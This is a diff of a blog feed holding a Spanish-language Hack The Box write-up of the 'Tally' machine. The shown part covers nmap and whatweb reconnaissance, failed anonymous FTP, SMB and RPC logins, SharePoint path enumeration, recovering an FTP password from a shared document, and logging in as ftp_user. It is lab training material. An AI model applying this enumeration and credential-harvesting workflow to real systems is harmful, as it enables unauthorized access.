 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.56.&lt;/p&gt;
@@ -4651,994 +5125,4 @@ root
 &lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ya somo el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina SolidState en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Tally</title><link href="http://localhost:4000/htb-tally/" rel="alternate" type="text/html" title="Hack The Box Tally" /><published>2021-11-26T00:00:00-06:00</published><updated>2021-11-26T00:00:00-06:00</updated><id>http://localhost:4000/htb-tally</id><content type="html" xml:base="http://localhost:4000/htb-tally/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-tally/banner-tally.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;tally&quot;&gt;Tally&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.59.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.59
-PING 10.10.10.59 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.59&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.59: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;138 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.59 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 138.013/138.013/138.013/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.59 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-18 21:23 CST
-Initiating SYN Stealth Scan at 21:23         
-Scanning 10.10.10.59 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]           
-Discovered open port 139/tcp on 10.10.10.59  
-Discovered open port 80/tcp on 10.10.10.59   
-Discovered open port 21/tcp on 10.10.10.59 
-Discovered open port 445/tcp on 10.10.10.59  
-Discovered open port 135/tcp on 10.10.10.59 
-Discovered open port 5985/tcp on 10.10.10.59
-Discovered open port 49670/tcp on 10.10.10.59
-Discovered open port 32844/tcp on 10.10.10.59
-Discovered open port 32843/tcp on 10.10.10.59
-Discovered open port 49666/tcp on 10.10.10.59
-Discovered open port 49668/tcp on 10.10.10.59                                                                                    
-Discovered open port 47001/tcp on 10.10.10.59
-Discovered open port 49664/tcp on 10.10.10.59 
-Discovered open port 808/tcp on 10.10.10.59
-Discovered open port 32846/tcp on 10.10.10.59                                                                                    
-Discovered open port 1433/tcp on 10.10.10.59                                                                                     
-Discovered open port 81/tcp on 10.10.10.59
-Discovered open port 49669/tcp on 10.10.10.59
-Discovered open port 49665/tcp on 10.10.10.59
-Discovered open port 15567/tcp on 10.10.10.59
-Discovered open port 49667/tcp on 10.10.10.59
-Completed SYN Stealth Scan at 21:24, 19.22s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.59            
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Scanned at 2021-11-18 21:23:45 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;19s  
-Not shown: 64411 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1103 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
-PORT      STATE SERVICE      REASON
-21/tcp    open  ftp          syn-ack ttl 127
-80/tcp    open  http         syn-ack ttl 127
-81/tcp    open  hosts2-ns    syn-ack ttl 127
-135/tcp   open  msrpc        syn-ack ttl 127
-139/tcp   open  netbios-ssn  syn-ack ttl 127
-445/tcp   open  microsoft-ds syn-ack ttl 127
-808/tcp   open  ccproxy-http syn-ack ttl 127
-1433/tcp  open  ms-sql-s     syn-ack ttl 127
-5985/tcp  open  wsman        syn-ack ttl 127
-15567/tcp open  unknown      syn-ack ttl 127
-32843/tcp open  unknown      syn-ack ttl 127
-32844/tcp open  unknown      syn-ack ttl 127
-32846/tcp open  unknown      syn-ack ttl 127
-47001/tcp open  winrm        syn-ack ttl 127
-49664/tcp open  unknown      syn-ack ttl 127
-49665/tcp open  unknown      syn-ack ttl 127
-49666/tcp open  unknown      syn-ack ttl 127
-49667/tcp open  unknown      syn-ack ttl 127
-49668/tcp open  unknown      syn-ack ttl 127
-49669/tcp open  unknown      syn-ack ttl 127
-49670/tcp open  unknown      syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;19.33 seconds
-           Raw packets sent: 94470 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.157MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 73599 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.944MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.59
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 21,80,81,135,139,445,808,1433,5985,15567,32843,32844,32846,47001,49664,49665,49666,49667,49668,49669
-       │ ,49670
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,80,81,135,139,445,808,1433,5985,15567,32843,32844,32846,47001,49664,49665,49666,49667,49668,49669,49670 10.10
-.10.59 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted                                             
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-18 21:25 CST 
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.59                                                                                                 
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                     
-                                
-PORT      STATE SERVICE            VERSION                                                                                       
-21/tcp    open  ftp                Microsoft ftpd                                                                                
-| ftp-syst:                                                     
-|_  SYST: Windows_NT                                                                                                             
-80/tcp    open  http               Microsoft IIS httpd 10.0
-|_http-generator: Microsoft SharePoint                                                                                           
-| http-ntlm-info:                                                                                                                
-|   Target_Name: TALLY                                          
-|   NetBIOS_Domain_Name: TALLY                                                                                                   
-|   NetBIOS_Computer_Name: TALLY                        
-|   DNS_Domain_Name: TALLY                                      
-|   DNS_Computer_Name: TALLY                                    
-|_  Product_Version: 10.0.14393                                 
-|_http-server-header: Microsoft-IIS/10.0                                                                                         
-| http-title: Home            
-|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
-81/tcp    open  http               Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Bad Request                                       
-135/tcp   open  msrpc              Microsoft Windows RPC                                                                         
-139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn          
-445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
-808/tcp   open  ccproxy-http?
-1433/tcp  open  ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; RTM
-| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SSL_Self_Signed_Fallback
-| Not valid before: 2021-11-19T03:28:04                         
-|_Not valid after:  2051-11-19T03:28:04
-| ms-sql-ntlm-info:                                             
-|   Target_Name: TALLY         
-|   NetBIOS_Domain_Name: TALLY                                  
-|   NetBIOS_Computer_Name: TALLY 
-|   DNS_Domain_Name: TALLY
-|   DNS_Computer_Name: TALLY  
-|_  Product_Version: 10.0.14393                                 
-|_ssl-date: 2021-11-19T03:31:34+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +4m58s from scanner time.
-5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-server-header: Microsoft-HTTPAPI/2.0                     
-|_http-title: Not Found                                                                                                          
-15567/tcp open  http               Microsoft IIS httpd 10.0                                                                      
-|_http-server-header: Microsoft-IIS/10.0                    
-| http-auth:                                                                                                                     
-| HTTP/1.1 401 Unauthorized&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0D                                 
-|   Negotiate                                                                                                                    
-|_  NTLM
-|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title.
-| http-ntlm-info: 
-|   Target_Name: TALLY
-|   NetBIOS_Domain_Name: TALLY
-|   NetBIOS_Computer_Name: TALLY 
-|   DNS_Domain_Name: TALLY
-|   DNS_Computer_Name: TALLY
-|_  Product_Version: 10.0.14393
-32843/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Service Unavailable
-32844/tcp open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
-| Subject Alternative Name: DNS:localhost, DNS:tally
-| Not valid before: 2017-09-17T22:51:16
-|_Not valid after:  9999-01-01T00:00:00
-|_ssl-date: 2021-11-19T03:31:34+00:00; +4m58s from scanner time. 
-|_http-title: Service Unavailable
-| tls-alpn: 
-|   h2
-|_  http/1.1
-32846/tcp open  storagecraft-image StorageCraft Image Manager
-47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-49664/tcp open  msrpc              Microsoft Windows RPC
-49665/tcp open  msrpc              Microsoft Windows RPC
-49666/tcp open  msrpc              Microsoft Windows RPC
-49667/tcp open  msrpc              Microsoft Windows RPC
-49668/tcp open  msrpc              Microsoft Windows RPC
-49669/tcp open  msrpc              Microsoft Windows RPC
-49670/tcp open  msrpc              Microsoft Windows RPC
-Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2021-11-19T03:31:12
-|_  start_date: 2021-11-19T03:27:44
-| ms-sql-info: 
-|   10.10.10.59:1433: 
-|     Version: 
-|       name: Microsoft SQL Server 2016 RTM
-|       number: 13.00.1601.00
-|       Product: Microsoft SQL Server 2016
-|       Service pack level: RTM
-|       Post-SP patches applied: false
-|_    TCP port: 1433
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-|_clock-skew: mean: 4m57s, deviation: 0s, median: 4m57s
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 89.10 seconds
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos varios puertos abiertos y como recomendación, vamos primero con aquellos que tengan presente el servicio HTTP. Antes de ingresar vía web, vamos a tratar de ver a lo que nos enfrentamos con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.59/
-http://10.10.10.59/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302 Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.59], Microsoft-IIS[10.0], Microsoft-Sharepoint[15.0.0.4420], RedirectLocation[http://10.10.10.59/default.aspx], Title[Document Moved], UncommonHeaders[x-sharepointhealthscore,sprequestguid,request-id,sprequestduration,spiislatency,microsoftsharepointteamservices,x-content-type-options,x-ms-invokeapp], X-Frame-Options[SAMEORIGIN], X-Powered-By[ASP.NET]
-
-http://10.10.10.59/default.aspx &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.59], MetaGenerator[Microsoft SharePoint], Microsoft-IIS[10.0], Microsoft-Sharepoint[15.0.0.4420], Script[text/javascript], Title[Home - Home][Title element contains newline&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)!]&lt;/span&gt;, UncommonHeaders[x-sharepointhealthscore,sprequestguid,request-id,sprequestduration,spiislatency,microsoftsharepointteamservices,x-content-type-options,x-ms-invokeapp], X-Frame-Options[SAMEORIGIN], X-Powered-By[ASP.NET], X-UA-Compatible[IE&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Aquí vemos que se tiene un &lt;strong&gt;Microsoft Sharepoint&lt;/strong&gt; el cual podemos ver si ingresamos vía web.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-tally/tally-sharepoint.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Otro puerto en el cual podría haber algo sería el 15567 que al ingresar vía web, nos solicita credenciales, las cuales no contamos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.59:15567/
-http://10.10.10.59:15567/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.59], Microsoft-IIS[10.0], Microsoft-Sharepoint[15.0.0.4420], UncommonHeaders[sprequestguid,request-id,sprequestduration,spiislatency,microsoftsharepointteamservices,x-content-type-options,x-ms-invokeapp], WWW-Authenticate[Negotiate, NTLM], X-Frame-Options[SAMEORIGIN], X-Powered-By[ASP.NET]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-tally/tally-http.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Analizando un poco más la información que tenemos, vemos el puerto 21 y el 445 abiertos a los cuales podríamos tratar de conectarnos como el usuario &lt;em&gt;anonymous&lt;/em&gt; para el FTP y &lt;em&gt;null&lt;/em&gt; para SMB; sin embargo, no podemos y no vemos nada interesante.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ftp 10.10.10.59                                               
-Connected to 10.10.10.59.                                       
-220 Microsoft FTP Service
-Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.59:k4miyo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous                                                                                             
-331 Password required
-Password:                                                       
-530 User cannot log &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                                          
-Login failed.                                                   
-Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is Windows_NT.                                                                                                
-ftp&amp;gt; quit        
-221 Goodbye.                                                                                                                     
-❯ crackmapexec smb 10.10.10.59 &lt;span class=&quot;nt&quot;&gt;--shares&lt;/span&gt;
-SMB         10.10.10.59     445    TALLY            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows Server 2016 Standard 14393 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:TALLY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:TALLY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signi
-ng:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                          
-Traceback &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;most recent call last&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:                                                                                               
-  File &lt;span class=&quot;s2&quot;&gt;&quot;/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/impacket/nmb.py&quot;&lt;/span&gt;, line 983, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;non_polling_read
-    received &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; self._sock.recv&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bytes_left&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                       
-  File &lt;span class=&quot;s2&quot;&gt;&quot;/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/gevent/_socketcommon.py&quot;&lt;/span&gt;, line 657, &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;recv
-    &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;self._sock.recv&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;args&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                
-ConnectionResetError: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Errno 104] Connection reset by peer
-❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.59 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
-session setup failed: NT_STATUS_ACCESS_DENIED
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que también está el servicio &lt;strong&gt;Microsoft Windows RPC&lt;/strong&gt; por lo que podríamos tratar de conectarnos con una null session:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; 10.10.10.59
-Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;s password: 
-Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como no pudimos obtener informacion relevante de los puerto, vamos a regresar con el sitio web &lt;strong&gt;&lt;em&gt;Microsoft Sharepoint&lt;/em&gt;&lt;/strong&gt; y lo normal sería aplicar un fuzzing para tratar de descubrir recursos dentro de la máquina; sin embargo, debido a la lentitud de la misma, vamos a tratar de encontrar un recurso que nos ayude para probar rutas que podrían existir, para este caso, vamos a utilizar &lt;a href=&quot;https://the-infosec.com/2017/04/18/penetration-testing-sharepoint/&quot;&gt;the-infosec&lt;/a&gt;. Utilizaremos el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_layouts/15/viewlsts.aspx&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-tally/tally-view.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que los directorios &lt;strong&gt;Documents&lt;/strong&gt; y &lt;strong&gt;Site Pages&lt;/strong&gt; presentan contenido, así que vamos a echarles un ojo. El directorio &lt;strong&gt;Documents&lt;/strong&gt; tiene un archivo llamado &lt;strong&gt;ftp-details&lt;/strong&gt;, así que vamos a descargarlo y ver su contenido.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-tally/tally-ftp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al abrir el archivo, nos aparece una contraseña de acceso por el servicio FTP; sin embargo, no contamos con el usuario.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-tally/tally-word.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para el caso del directorio &lt;strong&gt;Site Pages&lt;/strong&gt;, si checamos la dirección URL, nos sale algo como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.59/_layouts/15/start.aspx#/SitePages/Forms/AllPages.aspx&lt;/code&gt;; lo que se está aplicando una redirección incorrecta, así que vamos a eliminar la parte &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_layouts/15/start.aspx#/&lt;/code&gt; para que nos quede así &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.59/SitePages/Forms/AllPages.aspx&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-tally/tally-site.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De igual forma, nos descargamos el recurso para ver su contenido. Hay que tener cuidado porque se aplica la redirección incorrecta y debemos de eliminar la misma parte &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_layouts/15/start.aspx#/&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-tally/tally-finance.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Leyendo un poco, vemos que se le está solicitando al usuario &lt;strong&gt;Rahul&lt;/strong&gt; subir archivos usando la cuenta &lt;strong&gt;ftp_user&lt;/strong&gt;. Por lo que ya a este punto, contamos con posibles credenciales válidas de acceso al servicio FTP, así que vamos a probarlas:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ftp 10.10.10.59
-Connected to 10.10.10.59.
-220 Microsoft FTP Service
-Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.59:k4miyo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: ftp_user
-331 Password required
-Password:
-230 User logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is Windows_NT.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
-125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
-08-31-17  10:51PM       &amp;lt;DIR&amp;gt;          From-Custodian
-10-01-17  10:37PM       &amp;lt;DIR&amp;gt;          Intranet
-08-28-17  05:56PM       &amp;lt;DIR&amp;gt;          Logs
-09-15-17  08:30PM       &amp;lt;DIR&amp;gt;          To-Upload
-09-17-17  08:27PM       &amp;lt;DIR&amp;gt;          User
-226 Transfer complete.
-ftp&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
